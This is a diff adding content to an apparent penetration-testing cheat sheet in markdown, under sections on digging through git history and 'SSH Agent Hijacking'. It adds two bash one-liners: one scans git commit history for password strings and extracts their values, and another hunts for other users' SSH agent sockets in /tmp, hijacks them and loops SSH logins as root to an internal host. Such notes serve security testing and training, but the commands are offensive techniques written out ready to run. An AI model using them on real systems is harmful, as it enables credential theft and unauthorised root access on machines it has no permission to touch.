@@ -1569,6 +1569,12 @@ Alternatively, we can use diff:
 git diff <ID>
 ```
 
+Alternatively, we can just go to the .git/log directory and do something like the following:
+
+```bash
+for i in $(cat HEAD | awk -F " " '{print $1}' ); do git show $i | grep passw | awk -F '=' '{print $NF}'; done 2>/dev/null
+```
+
 ### SSH Agent Hijacking
 
 We need to set the environment variable SSH\_SOCK\_AUTH to the agent file, and then just ssh:
@@ -1597,6 +1603,12 @@ export SSH_AUTH_SOCK=$PWD/$(ls)
 #ssh-add -l
 #ssh-add -1
 ssh root@172.10.0.1 -p 2222
+```
+
+Alternative one-liner:
+
+```bash
+while true; do a=$(ls /tmp/ssh-*/agent.*); export SSH_AUTH_SOCK=$a; ssh root@172.18.0.1 -p 2222; done 2>/dev/null
 ```
 
 ### Gosu
